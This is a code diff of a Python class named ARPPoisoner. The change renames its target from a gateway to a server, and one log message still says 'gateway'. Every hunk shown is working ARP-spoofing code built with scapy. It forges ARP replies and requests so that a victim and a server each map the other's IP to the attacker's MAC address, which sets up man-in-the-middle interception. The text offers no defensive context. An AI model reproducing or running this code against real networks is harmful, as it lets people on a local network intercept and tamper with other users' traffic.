@@ -4,10 +4,10 @@ import time;
 import threading;
 
 class ARPPoisoner:
-    def __init__(self, interface, victim_ip, gateway_ip, attacker_mac, logger):
+    def __init__(self, interface, victim_ip, server_ip, attacker_mac, logger):
         self.interface = interface
         self.victim_ip = victim_ip
-        self.gateway_ip = gateway_ip
+        self.server_ip = server_ip
         self.attacker_mac = attacker_mac
         self.logger = logger
 
@@ -55,13 +55,13 @@ class ARPPoisoner:
                 log("Failed getting victim mac")
                 return
             
-            gateway_mac = self.get_mac(self.gateway_ip)
+            server_mac = self.get_mac(self.server_ip)
 
-            if not gateway_mac:
+            if not server_mac:
                 log("Failed getting gateway mac")
                 return
 
-            # Tell the victim that we are the gateway.
+            # Tell the victim that we are the server.
             # 1. ARP Reply (is-at) - standard poisoning
             victim_arp_reply = (
                 sc.Ether(dst=victim_mac) /
@@ -69,7 +69,7 @@ class ARPPoisoner:
                     op=2,
                     pdst=self.victim_ip,
                     hwdst=victim_mac,
-                    psrc=self.gateway_ip,
+                    psrc=self.server_ip,
                     hwsrc=self.attacker_mac
                 )
             )
@@ -80,28 +80,28 @@ class ARPPoisoner:
                     op=1,
                     pdst=self.victim_ip,
                     hwdst=victim_mac,
-                    psrc=self.gateway_ip,
+                    psrc=self.server_ip,
                     hwsrc=self.attacker_mac
                 )
             )
 
-            # Tell the gateway that we are the victim
+            # Tell the server that we are the victim
             gateway_arp_reply = (
-                sc.Ether(dst=gateway_mac) /
+                sc.Ether(dst=server_mac) /
                 ARP(
                     op=2,
-                    pdst=self.gateway_ip,
-                    hwdst=gateway_mac,
+                    pdst=self.server_ip,
+                    hwdst=server_mac,
                     psrc=self.victim_ip,
                     hwsrc=self.attacker_mac
                 )
             )
             gateway_arp_req = (
-                sc.Ether(dst=gateway_mac) /
+                sc.Ether(dst=server_mac) /
                 ARP(
                     op=1,
-                    pdst=self.gateway_ip,
-                    hwdst=gateway_mac,
+                    pdst=self.server_ip,
+                    hwdst=server_mac,
                     psrc=self.victim_ip,
                     hwsrc=self.attacker_mac
                 )
